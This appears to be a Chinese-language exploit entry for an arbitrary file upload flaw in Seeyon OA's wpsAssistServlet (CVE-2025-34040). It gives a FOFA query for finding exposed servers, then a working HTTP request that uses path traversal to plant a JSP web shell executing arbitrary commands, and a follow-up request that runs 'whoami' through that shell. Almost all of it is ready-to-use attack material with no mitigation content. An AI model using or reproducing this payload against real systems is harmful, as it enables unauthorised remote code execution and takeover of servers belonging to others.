## 致远OA-wpsAssistServlet-任意文件上传漏洞(CVE-2025-34040)

## 一、漏洞简介
致远OA wpsAssistServlet 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
app="致远互联-OA" && title="V8.0SP2"
```

## POC
```
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../ApacheJetspeed/webapps/ROOT/pehhxgg.jsp&fileId=2 HTTP/1.1
Host: ?
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFJZ4P1AZBixjElj
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

------WebKitFormBoundaryFFJZ4P1AZBixjElj
Content-Disposition: form-data; name="upload"; filename="pehhxg.xls"
Content-Type: application/vnd.ms-excel

<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[] b=new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFFJZ4P1AZBixjElj--
```

## POC
```
GET /pehhxgg.jsp?cmd=whoami HTTP/1.1
Host: ?
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
```
